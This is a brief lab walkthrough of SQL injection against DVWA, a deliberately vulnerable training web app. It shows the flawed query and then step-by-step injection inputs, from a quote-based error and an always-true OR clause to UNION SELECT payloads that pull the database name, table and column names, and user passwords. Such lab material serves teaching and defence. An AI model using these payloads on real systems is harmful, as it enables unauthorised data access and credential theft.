
# SQL Injection Demo


## Source Code Location
```
docker exec -it dvwa bash 
# cd /var/www/html
# cd /var/www/html/vulnerabilities/sqli
```

## Vunerable SQL Code

* Source Files: /var/www/html/vulnerabilities/sqli/source/low.php
* Note: $id comes from User Input

```
SELECT first_name, last_name FROM users WHERE user_id = '$id';
```

## On Web Form, Try

* User ID = Re11k'
* Should Get Error:
```
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''Re11k''' at line 1
```

Note: 
```
SELECT first_name, last_name FROM users WHERE user_id = ''Re11k''
```

## Now Try

* User ID = Re11k' or 'a' = 'a
* Should See Data Exposed

Note:
```
SELECT first_name, last_name FROM users WHERE user_id = 'Re11k' or 'a' = 'a'
```


## Get Database Name

* User ID = Re11k' and 1=1 union select null, database() #

Note:
```
SELECT first_name, last_name FROM users WHERE user_id = 'RRe11k' and 1=1 union select null, database() #'
```


## Get Table Names

* User ID = Re11k' and 1=1 union select null, table_name from information_schema.tables #


## Get Columns from Users Table

* User ID = Re11k' and 1=1 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #


## Get Passwords

* User ID = Re11k' and 1=1 union select null, concat(user,0x0a,password) from users #









